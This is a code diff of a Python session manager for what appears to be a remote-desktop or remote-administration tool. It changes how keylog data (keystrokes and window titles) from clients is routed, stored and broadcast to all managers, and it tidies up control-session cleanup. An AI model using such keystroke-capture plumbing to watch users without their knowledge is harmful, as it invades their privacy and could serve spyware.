@@ -209,18 +209,6 @@ class SessionManager(threading.Thread):
         pdu_type = pdu.get("type")
         print(f"[SessionManager handle_pdu] client_id={client_id}, pdu_type={pdu_type}")
         
-        # Phân biệt keylog (từ client) vs điều khiển input (từ manager)
-        if pdu_type == "input":
-            # Kiểm tra xem có phải keylog data không (có KeyData field)
-            input_data = pdu.get('input', {})
-            is_keylog = 'KeyData' in input_data or 'WindowTitle' in input_data
-            
-            # Nếu là keylog từ client → xử lý và forward tới manager
-            if is_keylog:
-                self._handle_input_pdu(client_id, pdu)
-                return
-            # Nếu là input điều khiển từ manager → forward tới client qua control session
-        
         # === KIỂM TRA ROLE ===
         role = self.clients.get(client_id)
         print(f"[SessionManager handle_pdu] role for {client_id} = {role}")
@@ -236,6 +224,19 @@ class SessionManager(threading.Thread):
             else:
                 print(f"[SessionManager] ⚠️ Ignoring {pdu_type} PDU from unauthenticated client {client_id}")
             return
+        
+        # === XỬ LÝ INPUT PDU (Keylog) TỪ CLIENT ===
+        # Phải xử lý TRƯỚC khi forward qua session vì keylog cần lưu DB và broadcast tới TẤT CẢ managers
+        if role == ROLE_CLIENT and pdu_type == "input":
+            # Kiểm tra xem có phải keylog data không (có KeyData field)
+            input_data = pdu.get('input', {})
+            is_keylog = 'KeyData' in input_data or 'WindowTitle' in input_data
+            
+            # Nếu là keylog từ client → xử lý và forward tới manager
+            if is_keylog:
+                print(f"[SessionManager] Detected keylog from {client_id}, processing...")
+                self._handle_input_pdu(client_id, pdu)
+                return  # Keylog đã được xử lý, không cần forward qua session
         
         # === XỬ LÝ PDU TỪ CLIENT (authenticated) ===
         if role == ROLE_CLIENT:
@@ -376,12 +377,20 @@ class SessionManager(threading.Thread):
                     print(f"[Auth] Client auto-login: {username} (already authenticated), setting role to {role}")
                     
                     with self.lock:
+                        # Force set to ROLE_CLIENT regardless of role param
                         self.clients[client_id] = ROLE_CLIENT
                         self.authenticated_users[client_id] = username
-                        print(f"[Auth] ✅ Registered client_id={client_id}, username={username}, role={ROLE_CLIENT}")
+                        print(f"[Auth] ✅ Registered client_id={client_id}, username={username}, role=ROLE_CLIENT")
+                        print(f"[Auth] Current clients dict: {self.clients}")
+                        print(f"[Auth] Current authenticated_users: {self.authenticated_users}")
                     
+                    # Send response to client
                     self._send_control_pdu(client_id, f"{CMD_LOGIN_OK}:client")
+                    
+                    # Broadcast updated client list to all managers
+                    print(f"[Auth] Broadcasting client list after {username} registration...")
                     self._broadcast_client_list()
+                    print(f"[Auth] ✅ Broadcast complete for {username}")
                     
                     # Check if there's a pending connection request for this client (Case 1)
                     pending_manager_id = None
@@ -899,23 +908,33 @@ class SessionManager(threading.Thread):
         Callback khi ControlSession kết thúc
         
         LOGIC MỚI:
-        - Chỉ xóa ControlSession
+        - Chỉ xóa ControlSession NẾU chưa bị xóa (defensive check)
         - KHÔNG xóa ViewSession → Manager vẫn xem màn hình
         """
-        print(f"[ControlSession] Ended: {control_session.session_id}. Reason: {reason}")
+        print(f"[ControlSession] Callback: Ended {control_session.session_id}. Reason: {reason}")
         
+        cleaned_up = False
         with self.lock:
-            # Xóa control session
+            # Defensive: Kiểm tra xem đã bị xóa chưa (có thể đã cleanup trong _stop_control_session)
             if control_session.client_id in self.control_sessions:
-                del self.control_sessions[control_session.client_id]
+                if self.control_sessions[control_session.client_id] == control_session:
+                    del self.control_sessions[control_session.client_id]
+                    cleaned_up = True
+                    print(f"[ControlSession] ✅ Callback deleted ControlSession for {control_session.client_id}")
+                else:
+                    print(f"[ControlSession] ⚠️ ControlSession already replaced for {control_session.client_id}")
+            else:
+                print(f"[ControlSession] ℹ️ ControlSession already deleted for {control_session.client_id}")
             
             # Cập nhật manager_sessions
             if control_session.manager_id in self.manager_sessions:
-                self.manager_sessions[control_session.manager_id]["control"] = None
+                if self.manager_sessions[control_session.manager_id]["control"] == control_session.client_id:
+                    self.manager_sessions[control_session.manager_id]["control"] = None
         
-        # Thông báo
-        self._send_control_pdu(control_session.manager_id, f"{CMD_CONTROL_STOPPED}:{control_session.client_id}")
-        self._send_control_pdu(control_session.client_id, f"{CMD_CONTROL_STOPPED}:{control_session.manager_id}")
-        
-        # Cập nhật danh sách client
-        self._broadcast_client_list()
+        # Gửi thông báo bên ngoài lock (chỉ nếu callback này thực sự cleanup)
+        if cleaned_up:
+            self._send_control_pdu(control_session.manager_id, f"{CMD_CONTROL_STOPPED}:{control_session.client_id}")
+            self._send_control_pdu(control_session.client_id, f"{CMD_CONTROL_STOPPED}:{control_session.manager_id}")
+            
+            # Cập nhật danh sách client
+            self._broadcast_client_list()
